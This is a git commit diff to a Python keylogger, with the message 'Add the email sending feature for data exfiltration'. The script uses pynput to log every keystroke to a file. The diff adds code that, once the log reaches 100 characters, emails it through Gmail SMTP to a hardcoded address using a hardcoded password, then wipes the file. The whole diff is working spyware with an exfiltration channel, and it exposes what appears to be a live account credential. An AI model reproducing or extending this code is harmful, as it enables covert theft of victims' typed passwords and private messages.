6ce5dc38b2fec6b2786d0a1ff2f3ff59eeeee911
cyberr-genius <soulamahannapro@gmail.com>
2026-03-24 10:48:07 +0000

    Add the email sending feature for data exfiltration

--- main.py
+++ main.py
@@ -1,5 +1,9 @@
 #r= reading, w=write a=apending
-#import
+import smtplib
+import os
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.message import EmailMessage
 from pynput.keyboard import Listener,Key
 def writetofile(key):
     try:
@@ -20,10 +24,45 @@ def writetofile(key):
             keydata= ""
         if key==Key.enter:
             keydata= "\n"
-   
+            
+
     with open('log.txt', 'a',encoding='utf-8') as f:
         f.write(keydata)
+    with open('log.txt', 'r', encoding='utf-8') as f:
+            content = f.read()
+            if len(content)>=100:
+                send_email_with_content(content)
+                open("log.txt", "w").close()
+def send_email_with_content(content):
+    email = "lolabagnyan@gmail.com"
+    password = "mesvrnuwljwerjay"
 
+    msg = EmailMessage()
+    msg["Subject"] = "confidential"
+    msg["From"] = email
+    msg["To"] = email
+    msg.set_content("data extraction")
+
+    file_path = "log.txt"
+
+    if not os.path.exists(file_path):
+        print("file not found !")
+        exit()
+
+    with open(file_path, "rb") as f:
+        msg.add_attachment(
+            f.read(),
+            maintype="text",
+            subtype="plain",
+            filename="log.txt"
+        )
+
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+        smtp.login(email, password)
+        smtp.send_message(msg)
+
+    print("Mail sent")
 with Listener(on_press=writetofile) as l:
     l.join()
+
 
